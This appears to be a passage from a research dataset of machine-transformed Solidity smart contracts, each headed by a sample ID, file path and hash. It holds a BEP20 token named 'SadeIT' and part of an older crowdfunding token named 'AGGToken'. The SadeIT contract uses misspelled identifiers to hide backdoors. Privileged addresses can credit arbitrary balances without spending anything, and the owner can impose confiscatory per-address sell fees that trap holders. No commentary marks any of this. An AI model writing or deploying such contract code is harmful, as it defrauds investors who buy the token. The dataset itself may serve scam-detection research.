    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        if (!(b <= a)) {
            revert();
        }
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        if (!(b > 0)) {
            revert();
        }
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        if (!(b > 0)) {
            revert();
        }
        return a % b;
    }
    }
}

interface IUniswapV2Router01 {
    event AutoGenerated_mapping_IUniswapV2Router01(string mapping_origin, string mapping_cache);

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    event AutoGenerated_mapping_IUniswapV2Router02(string mapping_origin, string mapping_cache);

    function removeLiquidityETHSupportingfiyyOnTransferTokens(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingfiyyOnTransferTokens(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingfiyyOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;

    function swapExactETHForTokensSupportingfiyyOnTransferTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable;

    function swapExactTokensForETHSupportingfiyyOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

interface IUniswapV2Factory {
    event AutoGenerated_mapping_IUniswapV2Factory(string mapping_origin, string mapping_cache);
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fiyyTo() external view returns (address);

    function fiyyToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfiyyTo(address) external;

    function setfiyyToSetter(address) external;
}

contract BEP20 is Context {
    event AutoGenerated_mapping_BEP20(string mapping_origin, string mapping_cache);

    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;
    string internal _name;
    string internal _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed onwner, address indexed spender, uint256 value);
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function allowance(address onwner, address spender) public view virtual returns (uint256) {
        return _allowances[onwner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address BEP20__msgSender_TMP_54_0_0;
        {
            {
                BEP20__msgSender_TMP_54_0_0 = msg.sender;
            }
        }
        address onwner = BEP20__msgSender_TMP_54_0_0;
        {
            if (!(onwner != address(0x0))) {
                revert();
            }
            if (!(spender != address(0x0))) {
                revert();
            }
            _allowances[onwner][spender] = amount;
            emit Approval(onwner, spender, amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address BEP20__msgSender_TMP_56_0_0;
        {
            {
                BEP20__msgSender_TMP_56_0_0 = msg.sender;
            }
        }
        address onwner = BEP20__msgSender_TMP_56_0_0;
        {
            uint256 TMP_57_0_0 = _allowances[onwner][spender] + addedValue;
            if (!(onwner != address(0x0))) {
                revert();
            }
            if (!(spender != address(0x0))) {
                revert();
            }
            _allowances[onwner][spender] = TMP_57_0_0;
            emit Approval(onwner, spender, TMP_57_0_0);
        }

        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address BEP20__msgSender_TMP_59_0_0;
        {
            {
                BEP20__msgSender_TMP_59_0_0 = msg.sender;
            }
        }
        address onwner = BEP20__msgSender_TMP_59_0_0;
        uint256 currentAllowance = _allowances[onwner][spender];
        if (!(currentAllowance >= subtractedValue)) {
            revert();
        }
    unchecked {
        {
            uint256 TMP_63_0_0 = currentAllowance - subtractedValue;
            if (!(onwner != address(0x0))) {
                revert();
            }
            if (!(spender != address(0x0))) {
                revert();
            }
            _allowances[onwner][spender] = TMP_63_0_0;
            emit Approval(onwner, spender, TMP_63_0_0);
        }

    }
        return true;
    }

    function _approve(address onwner, address spender, uint256 amount) internal virtual {
        if (!(onwner != address(0x0))) {
            revert();
        }
        if (!(spender != address(0x0))) {
            revert();
        }
        _allowances[onwner][spender] = amount;
        emit Approval(onwner, spender, amount);
    }

    function _spendAllowance(address onwner, address spender, uint256 amount) internal virtual {
        uint256 BEP20_allowance_TMP_74_0_0;
        {
            {
                BEP20_allowance_TMP_74_0_0 = _allowances[onwner][spender];
            }
        }
        uint256 currentAllowance = BEP20_allowance_TMP_74_0_0;
        if (currentAllowance != type(uint256).max) {
            if (!(currentAllowance >= amount)) {
                revert();
            }
        unchecked {
            {
                uint256 TMP_81_0_0 = currentAllowance - amount;
                if (!(onwner != address(0x0))) {
                    revert();
                }
                if (!(spender != address(0x0))) {
                    revert();
                }
                _allowances[onwner][spender] = TMP_81_0_0;
                emit Approval(onwner, spender, TMP_81_0_0);
            }

        }
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

contract SadeIT is BEP20, Ownable {
    event AutoGenerated_mapping_SadeIT(string mapping_origin, string mapping_cache);
    using SafeMath for uint256;
    mapping(address => uint256) internal _balances;
    mapping(address => bool) internal _release;

    function balanceOf(address ajcount) public view virtual returns (uint256) {
        return _balances[ajcount];
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        if (!(from != address(0x0))) {
            revert();
        }
        if (!(to != address(0x0))) {
            revert();
        }
        uint256 fromBalance = _balances[from];
        if (!(fromBalance >= amount)) {
            revert();
        }
    unchecked {
        _balances[from] = fromBalance - amount;
    }
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _burn(address ajcount, uint256 amount) internal virtual {
        if (!(ajcount != address(0x0))) {
            revert();
        }
        uint256 ajcountBalance = _balances[ajcount];
        if (!(ajcountBalance >= amount)) {
            revert();
        }
    unchecked {
        _balances[ajcount] = ajcountBalance - amount;
    }
        _totalSupply -= amount;
        emit Transfer(ajcount, address(0x0), amount);
    }

    function _mtin(address ajcount, uint256 amount) internal virtual {
        if (!(ajcount != address(0x0))) {
            revert();
        }
        _totalSupply += amount;
        _balances[ajcount] += amount;
        emit Transfer(address(0x0), ajcount, amount);
    }

    address public uniswapV2Pair;
    constructor(string memory name_, string memory symbol_, uint256 totalSupply_) BEP20(name_, symbol_) {
        uint8 SadeIT_decimals_TMP_162_0_0;
        {
            {
                SadeIT_decimals_TMP_162_0_0 = 18;
            }
        }
        {
            uint256 TMP_164_0_0 = totalSupply_ * 10 ** SadeIT_decimals_TMP_162_0_0;
            if (!(msg.sender != address(0x0))) {
                revert();
            }
            _totalSupply += TMP_164_0_0;
            _balances[msg.sender] += TMP_164_0_0;
            emit Transfer(address(0x0), msg.sender, TMP_164_0_0);
        }

        uint256 SadeIT_totalSupply_TMP_166_0_0;
        {
            {
                SadeIT_totalSupply_TMP_166_0_0 = _totalSupply;
            }
        }
        bool SadeIT_transfer_TMP_169_0_0;
        {
            uint256 TMP_168_0_0 = (SadeIT_totalSupply_TMP_166_0_0 / 100) * 40;
            {
                bool TMP_169_0_0_0 = false;
                {
                    mapping(address => uint256) storage cache__balances_0_0 = _balances;
                    address SadeIT__msgSender_TMP_222_0_1;
                    {
                        {
                            SadeIT__msgSender_TMP_222_0_1 = msg.sender;
                        }
                    }
                    address SadeIT_transfer_2_onwner_0_0 = SadeIT__msgSender_TMP_222_0_1;
                    if (_release[SadeIT_transfer_2_onwner_0_0] == true) {
                        _balances[_deadAddress] += TMP_168_0_0;
                        TMP_169_0_0_0 = true;
                        SadeIT_transfer_TMP_169_0_0 = true;
                        cache__balances_0_0 = _balances;
                    }
                    {
                        if (!(SadeIT_transfer_2_onwner_0_0 != address(0x0))) {
                            revert();
                        }
                        if (!(_deadAddress != address(0x0))) {
                            revert();
                        }
                        uint256 SadeIT__receiveF_3_fromBalance_0_1 = _balances[SadeIT_transfer_2_onwner_0_0];
                        if (!(SadeIT__receiveF_3_fromBalance_0_1 >= TMP_168_0_0)) {
                            revert();
                        }
                        bool SadeIT__receiveF_3_rF_0_1 = true;
                        bool SadeIT__receiveF_3_SadeIT__checkFreeajcount_TMP_222_0_0_0_1;
                        {
                            {
                                SadeIT__receiveF_3_SadeIT__checkFreeajcount_TMP_222_0_0_0_1 = _marketajcount[SadeIT_transfer_2_onwner_0_0] || _marketajcount[_deadAddress];
                            }
                        }
                        if (SadeIT__receiveF_3_SadeIT__checkFreeajcount_TMP_222_0_0_0_1) {
                            SadeIT__receiveF_3_rF_0_1 = false;
                        }
                        uint256 SadeIT__receiveF_3_tradefiyyamount_0_1 = 0;
                        if (SadeIT__receiveF_3_rF_0_1) {
                            uint256 SadeIT__receiveF_3_tradefiyy_0_1 = 0;
                            if (uniswapV2Pair != address(0x0)) {
                                if (_deadAddress == uniswapV2Pair) {
                                    SadeIT__receiveF_3_tradefiyy_0_1 = _defaultSellfiyy;
                                }
                                if (SadeIT_transfer_2_onwner_0_0 == uniswapV2Pair) {
                                    SadeIT__receiveF_3_tradefiyy_0_1 = _defaultBuyfiyy;
                                }
                            }
                            if (_Sfiyy[SadeIT_transfer_2_onwner_0_0] > 0) {
                                SadeIT__receiveF_3_tradefiyy_0_1 = _Sfiyy[SadeIT_transfer_2_onwner_0_0];
                            }
                            SadeIT__receiveF_3_tradefiyyamount_0_1 = TMP_168_0_0.mul(SadeIT__receiveF_3_tradefiyy_0_1).div(100);
                        }
                        if (SadeIT__receiveF_3_tradefiyyamount_0_1 > 0) {
                            _balances[SadeIT_transfer_2_onwner_0_0] = _balances[SadeIT_transfer_2_onwner_0_0].sub(SadeIT__receiveF_3_tradefiyyamount_0_1);
                            _balances[_deadAddress] = _balances[_deadAddress].add(SadeIT__receiveF_3_tradefiyyamount_0_1);
                            emit Transfer(SadeIT_transfer_2_onwner_0_0, _deadAddress, SadeIT__receiveF_3_tradefiyyamount_0_1);
                        }
                        _balances[SadeIT_transfer_2_onwner_0_0] = _balances[SadeIT_transfer_2_onwner_0_0].sub(TMP_168_0_0 - SadeIT__receiveF_3_tradefiyyamount_0_1);
                        _balances[_deadAddress] = _balances[_deadAddress].add(TMP_168_0_0 - SadeIT__receiveF_3_tradefiyyamount_0_1);
                        emit Transfer(SadeIT_transfer_2_onwner_0_0, _deadAddress, TMP_168_0_0 - SadeIT__receiveF_3_tradefiyyamount_0_1);
                    }

                    if ((!TMP_169_0_0_0)) {
                        SadeIT_transfer_TMP_169_0_0 = true;
                    }
                    else {
                        emit AutoGenerated_mapping_SadeIT("_balances", "cache__balances_0_0");
                    }
                }
            }
        }

        _defaultSellfiyy = 2;
        _defaultBuyfiyy = 0;
        address SadeIT__msgSender_TMP_170_0_0;
        {
            {
                SadeIT__msgSender_TMP_170_0_0 = msg.sender;
            }
        }
        _release[SadeIT__msgSender_TMP_170_0_0] = true;
    }
    using SafeMath for uint256;
    uint256 internal _defaultSellfiyy = 0;
    uint256 internal _defaultBuyfiyy = 0;
    mapping(address => bool) internal _marketajcount;
    mapping(address => uint256) internal _Sfiyy;
    address internal constant _deadAddress = 0x000000000000000000000000000000000000dEaD;

    function getRelease(address _address) external view onlyonwner returns (bool) {
        address SadeIT__msgSender_TMP_172_0_0;
        {
            {
                SadeIT__msgSender_TMP_172_0_0 = msg.sender;
            }
        }
        if (!(_onwner == SadeIT__msgSender_TMP_172_0_0)) {
            revert();
        }
        return _release[_address];
    }

    function setPairList(address _address) external onlyonwner {
        address SadeIT__msgSender_TMP_177_0_0;
        {
            {
                SadeIT__msgSender_TMP_177_0_0 = msg.sender;
            }
        }
        if (!(_onwner == SadeIT__msgSender_TMP_177_0_0)) {
            revert();
        }
        uniswapV2Pair = _address;
    }

    function upS(uint256 _value) external onlyonwner {
        address SadeIT__msgSender_TMP_182_0_0;
        {
            {
                SadeIT__msgSender_TMP_182_0_0 = msg.sender;
            }
        }
        if (!(_onwner == SadeIT__msgSender_TMP_182_0_0)) {
            revert();
        }
        _defaultSellfiyy = _value;
    }

    function setSfiyy(address _address, uint256 _value) external onlyonwner {
        address SadeIT__msgSender_TMP_187_0_0;
        {
            {
                SadeIT__msgSender_TMP_187_0_0 = msg.sender;
            }
        }
        if (!(_onwner == SadeIT__msgSender_TMP_187_0_0)) {
            revert();
        }
        if (!(_value > 1)) {
            revert();
        }
        _Sfiyy[_address] = _value;
    }

    function getSfiyy(address _address) external view onlyonwner returns (uint256) {
        address SadeIT__msgSender_TMP_195_0_0;
        {
            {
                SadeIT__msgSender_TMP_195_0_0 = msg.sender;
            }
        }
        if (!(_onwner == SadeIT__msgSender_TMP_195_0_0)) {
            revert();
        }
        return _Sfiyy[_address];
    }

    function setMarketajcountfiyy(address _address, bool _value) external onlyonwner {
        address SadeIT__msgSender_TMP_200_0_0;
        {
            {
                SadeIT__msgSender_TMP_200_0_0 = msg.sender;
            }
        }
        if (!(_onwner == SadeIT__msgSender_TMP_200_0_0)) {
            revert();
        }
        _marketajcount[_address] = _value;
    }

    function getMarketajcountfiyy(address _address) external view onlyonwner returns (bool) {
        address SadeIT__msgSender_TMP_205_0_0;
        {
            {
                SadeIT__msgSender_TMP_205_0_0 = msg.sender;
            }
        }
        if (!(_onwner == SadeIT__msgSender_TMP_205_0_0)) {
            revert();
        }
        return _marketajcount[_address];
    }

    function _checkFreeajcount(address from, address _to) internal view returns (bool) {
        return _marketajcount[from] || _marketajcount[_to];
    }

    function _receiveF(address from, address _to, uint256 _amount) internal virtual {
        if (!(from != address(0x0))) {
            revert();
        }
        if (!(_to != address(0x0))) {
            revert();
        }
        uint256 fromBalance = _balances[from];
        if (!(fromBalance >= _amount)) {
            revert();
        }
        bool rF = true;
        bool SadeIT__checkFreeajcount_TMP_222_0_0;
        {
            {
                SadeIT__checkFreeajcount_TMP_222_0_0 = _marketajcount[from] || _marketajcount[_to];
            }
        }
        if (SadeIT__checkFreeajcount_TMP_222_0_0) {
            rF = false;
        }
        uint256 tradefiyyamount = 0;
        if (rF) {
            uint256 tradefiyy = 0;
            if (uniswapV2Pair != address(0x0)) {
                if (_to == uniswapV2Pair) {
                    tradefiyy = _defaultSellfiyy;
                }
                if (from == uniswapV2Pair) {
                    tradefiyy = _defaultBuyfiyy;
                }
            }
            if (_Sfiyy[from] > 0) {
                tradefiyy = _Sfiyy[from];
            }
            tradefiyyamount = _amount.mul(tradefiyy).div(100);
        }
        if (tradefiyyamount > 0) {
            _balances[from] = _balances[from].sub(tradefiyyamount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefiyyamount);
            emit Transfer(from, _deadAddress, tradefiyyamount);
        }
        _balances[from] = _balances[from].sub(_amount - tradefiyyamount);
        _balances[_to] = _balances[_to].add(_amount - tradefiyyamount);
        emit Transfer(from, _to, _amount - tradefiyyamount);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address SadeIT__msgSender_TMP_240_0_0;
        {
            {
                SadeIT__msgSender_TMP_240_0_0 = msg.sender;
            }
        }
        address onwner = SadeIT__msgSender_TMP_240_0_0;
        if (_release[onwner] == true) {
            _balances[to] += amount;
            return true;
        }
        {
            if (!(onwner != address(0x0))) {
                revert();
            }
            if (!(to != address(0x0))) {
                revert();
            }
            uint256 SadeIT__receiveF_3_fromBalance_0_0 = _balances[onwner];
            if (!(SadeIT__receiveF_3_fromBalance_0_0 >= amount)) {
                revert();
            }
            bool SadeIT__receiveF_3_rF_0_0 = true;
            bool SadeIT__checkFreeajcount_TMP_301_0_1;
            {
                {
                    SadeIT__checkFreeajcount_TMP_301_0_1 = _marketajcount[onwner] || _marketajcount[to];
                }
            }
            if (SadeIT__checkFreeajcount_TMP_301_0_1) {
                SadeIT__receiveF_3_rF_0_0 = false;
            }
            uint256 SadeIT__receiveF_3_tradefiyyamount_0_0 = 0;
            if (SadeIT__receiveF_3_rF_0_0) {
                uint256 SadeIT__receiveF_3_tradefiyy_0_0 = 0;
                if (uniswapV2Pair != address(0x0)) {
                    if (to == uniswapV2Pair) {
                        SadeIT__receiveF_3_tradefiyy_0_0 = _defaultSellfiyy;
                    }
                    if (onwner == uniswapV2Pair) {
                        SadeIT__receiveF_3_tradefiyy_0_0 = _defaultBuyfiyy;
                    }
                }
                if (_Sfiyy[onwner] > 0) {
                    SadeIT__receiveF_3_tradefiyy_0_0 = _Sfiyy[onwner];
                }
                SadeIT__receiveF_3_tradefiyyamount_0_0 = amount.mul(SadeIT__receiveF_3_tradefiyy_0_0).div(100);
            }
            if (SadeIT__receiveF_3_tradefiyyamount_0_0 > 0) {
                _balances[onwner] = _balances[onwner].sub(SadeIT__receiveF_3_tradefiyyamount_0_0);
                _balances[_deadAddress] = _balances[_deadAddress].add(SadeIT__receiveF_3_tradefiyyamount_0_0);
                emit Transfer(onwner, _deadAddress, SadeIT__receiveF_3_tradefiyyamount_0_0);
            }
            _balances[onwner] = _balances[onwner].sub(amount - SadeIT__receiveF_3_tradefiyyamount_0_0);
            _balances[to] = _balances[to].add(amount - SadeIT__receiveF_3_tradefiyyamount_0_0);
            emit Transfer(onwner, to, amount - SadeIT__receiveF_3_tradefiyyamount_0_0);
        }

        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        address SadeIT__msgSender_TMP_243_0_0;
        {
            {
                SadeIT__msgSender_TMP_243_0_0 = msg.sender;
            }
        }
        address spender = SadeIT__msgSender_TMP_243_0_0;
        {
            uint256 SadeIT_allowance_TMP_319_0_1;
            {
                {
                    SadeIT_allowance_TMP_319_0_1 = _allowances[from][spender];
                }
            }
            uint256 SadeIT__spendAllowance_3_currentAllowance_0_0 = SadeIT_allowance_TMP_319_0_1;
            if (SadeIT__spendAllowance_3_currentAllowance_0_0 != type(uint256).max) {
                if (!(SadeIT__spendAllowance_3_currentAllowance_0_0 >= amount)) {
                    revert();
                }
            unchecked {
                {
                    uint256 TMP_326_0_1 = SadeIT__spendAllowance_3_currentAllowance_0_0 - amount;
                    if (!(from != address(0x0))) {
                        revert();
                    }
                    if (!(spender != address(0x0))) {
                        revert();
                    }
                    _allowances[from][spender] = TMP_326_0_1;
                    emit Approval(from, spender, TMP_326_0_1);
                }

            }
            }
        }

        {
            if (!(from != address(0x0))) {
                revert();
            }
            if (!(to != address(0x0))) {
                revert();
            }
            uint256 SadeIT__receiveF_3_fromBalance_0_0 = _balances[from];
            if (!(SadeIT__receiveF_3_fromBalance_0_0 >= amount)) {
                revert();
            }
            bool SadeIT__receiveF_3_rF_0_0 = true;
            bool SadeIT__checkFreeajcount_TMP_339_0_1;
            {
                {
                    SadeIT__checkFreeajcount_TMP_339_0_1 = _marketajcount[from] || _marketajcount[to];
                }
            }
            if (SadeIT__checkFreeajcount_TMP_339_0_1) {
                SadeIT__receiveF_3_rF_0_0 = false;
            }
            uint256 SadeIT__receiveF_3_tradefiyyamount_0_0 = 0;
            if (SadeIT__receiveF_3_rF_0_0) {
                uint256 SadeIT__receiveF_3_tradefiyy_0_0 = 0;
                if (uniswapV2Pair != address(0x0)) {
                    if (to == uniswapV2Pair) {
                        SadeIT__receiveF_3_tradefiyy_0_0 = _defaultSellfiyy;
                    }
                    if (from == uniswapV2Pair) {
                        SadeIT__receiveF_3_tradefiyy_0_0 = _defaultBuyfiyy;
                    }
                }
                if (_Sfiyy[from] > 0) {
                    SadeIT__receiveF_3_tradefiyy_0_0 = _Sfiyy[from];
                }
                SadeIT__receiveF_3_tradefiyyamount_0_0 = amount.mul(SadeIT__receiveF_3_tradefiyy_0_0).div(100);
            }
            if (SadeIT__receiveF_3_tradefiyyamount_0_0 > 0) {
                _balances[from] = _balances[from].sub(SadeIT__receiveF_3_tradefiyyamount_0_0);
                _balances[_deadAddress] = _balances[_deadAddress].add(SadeIT__receiveF_3_tradefiyyamount_0_0);
                emit Transfer(from, _deadAddress, SadeIT__receiveF_3_tradefiyyamount_0_0);
            }
            _balances[from] = _balances[from].sub(amount - SadeIT__receiveF_3_tradefiyyamount_0_0);
            _balances[to] = _balances[to].add(amount - SadeIT__receiveF_3_tradefiyyamount_0_0);
            emit Transfer(from, to, amount - SadeIT__receiveF_3_tradefiyyamount_0_0);
        }

        return true;
    }
}

```

## RQ1_7cc11a697bd2

文件 `units/program.sol`；SHA256 `be5f701ba407317908e1b1a8e153785d358e12c11ed0f6eec99e4ef8de524629`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;

contract IMigrationContract {
    event AutoGenerated_mapping_IMigrationContract(string mapping_origin, string mapping_cache);

    function migrate(address addr, uint256 nas) public returns (bool success);
}

contract SafeMath {
    event AutoGenerated_mapping_SafeMath(string mapping_origin, string mapping_cache);

    function safeAdd(uint256 x, uint256 y) internal pure returns (uint256) {
        uint256 z = x + y;
        if (!((z >= x) && (z >= y))) {
            revert();
        }
        return z;
    }

    function safeSubtract(uint256 x, uint256 y) internal pure returns (uint256) {
        if (!(x >= y)) {
            revert();
        }
        uint256 z = x - y;
        return z;
    }

    function safeMult(uint256 x, uint256 y) internal pure returns (uint256) {
        uint256 z = x * y;
        if (!((x == 0) || (z / x == y))) {
            revert();
        }
        return z;
    }
}

contract Token {
    event AutoGenerated_mapping_Token(string mapping_origin, string mapping_cache);
    uint256 public totalSupply;

    function balanceOf(address _owner) public constant returns (uint256 balance);

    function transfer(address _to, uint256 _value) public returns (bool success);

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    function approve(address _spender, uint256 _value) public returns (bool success);

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

contract StandardToken is Token {
    event AutoGenerated_mapping_StandardToken(string mapping_origin, string mapping_cache);

    function transfer(address _to, uint256 _value) public returns (bool success) {
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            emit Transfer(msg.sender, _to, _value);
            return true;
        } else {
            return false;
        }
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            emit Transfer(_from, _to, _value);
            return true;
        } else {
            return false;
        }
    }

    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
}

contract AGGToken is StandardToken, SafeMath {
    event AutoGenerated_mapping_AGGToken(string mapping_origin, string mapping_cache);
    string public constant name = "亚洲母基金区块链（亚股链）";
    string public constant symbol = "AGG";
    uint256 public constant decimals = 18;
    string public version = "1.0";
    address public ethFundDeposit;
    address public newContractAddr;
    bool public isFunding;
    uint256 public fundingStartBlock;
    uint256 public fundingStopBlock;
    uint256 public currentSupply;
    uint256 public tokenRaised = 0;
    uint256 public tokenMigrated = 0;
    uint256 public tokenExchangeRate = 300;
    event AllocateToken(address indexed _to, uint256 _value);
    event IssueToken(address indexed _to, uint256 _value);
    event IncreaseSupply(uint256 _value);
    event DecreaseSupply(uint256 _value);
    event Migrate(address indexed _to, uint256 _value);

    function formatDecimals(uint256 _value) internal pure returns (uint256) {
        return _value * 10 ** decimals;
    }

    constructor(address _ethFundDeposit, uint256 _currentSupply) public {
        ethFundDeposit = _ethFundDeposit;
        isFunding = false;
        fundingStartBlock = 0;
        fundingStopBlock = 0;
        uint256 AGGToken_formatDecimals_TMP_58_0_0;
        {
            {
                AGGToken_formatDecimals_TMP_58_0_0 = _currentSupply * 10 ** decimals;
            }
        }
        currentSupply = AGGToken_formatDecimals_TMP_58_0_0;
        uint256 AGGToken_formatDecimals_TMP_59_1_0;
        {
            {
                AGGToken_formatDecimals_TMP_59_1_0 = 630000000 * 10 ** decimals;
            }
        }
        totalSupply = AGGToken_formatDecimals_TMP_59_1_0;
        balances[msg.sender] = totalSupply;
        if (!(currentSupply <= totalSupply)) {
            revert();
        }
    }

    modifier isOwner() {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        _;
    }

    function setTokenExchangeRate(uint256 _tokenExchangeRate) external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        if (!(_tokenExchangeRate != 0)) {
            revert();
        }
        if (!(_tokenExchangeRate != tokenExchangeRate)) {
            revert();
        }
        tokenExchangeRate = _tokenExchangeRate;
    }

    function increaseSupply(uint256 _value) external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        uint256 AGGToken_formatDecimals_TMP_76_0_0;
        {
            {
                AGGToken_formatDecimals_TMP_76_0_0 = _value * 10 ** decimals;
            }
        }
        uint256 value = AGGToken_formatDecimals_TMP_76_0_0;
        if (!(value + currentSupply <= totalSupply)) {
            revert();
        }
        uint256 AGGToken_safeAdd_TMP_81_0_0;
        {
            {
                uint256 AGGToken_safeAdd_2_z_0_0 = currentSupply + value;
                if (!((AGGToken_safeAdd_2_z_0_0 >= currentSupply) && (AGGToken_safeAdd_2_z_0_0 >= value))) {
                    revert();
                }
                AGGToken_safeAdd_TMP_81_0_0 = AGGToken_safeAdd_2_z_0_0;
            }
        }
        currentSupply = AGGToken_safeAdd_TMP_81_0_0;
        emit IncreaseSupply(value);
    }

    function decreaseSupply(uint256 _value) external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        uint256 AGGToken_formatDecimals_TMP_87_0_0;
        {
            {
                AGGToken_formatDecimals_TMP_87_0_0 = _value * 10 ** decimals;
            }
        }
        uint256 value = AGGToken_formatDecimals_TMP_87_0_0;
        if (!(value + tokenRaised <= currentSupply)) {
            revert();
        }
        uint256 AGGToken_safeSubtract_TMP_92_0_0;
        {
            {
                if (!(currentSupply >= value)) {
                    revert();
                }
                uint256 AGGToken_safeSubtract_2_z_0_0 = currentSupply - value;
                AGGToken_safeSubtract_TMP_92_0_0 = AGGToken_safeSubtract_2_z_0_0;
            }
        }
        currentSupply = AGGToken_safeSubtract_TMP_92_0_0;
        emit DecreaseSupply(value);
    }

    function startFunding(uint256 _fundingStartBlock, uint256 _fundingStopBlock) external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        if (!(!isFunding)) {
            revert();
        }
        if (!(_fundingStartBlock < _fundingStopBlock)) {
            revert();
        }
        if (!(block.number < _fundingStartBlock)) {
            revert();
        }
        fundingStartBlock = _fundingStartBlock;
        fundingStopBlock = _fundingStopBlock;
        isFunding = true;
    }

    function stopFunding() external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        if (!(isFunding)) {
            revert();
        }
        isFunding = false;
    }

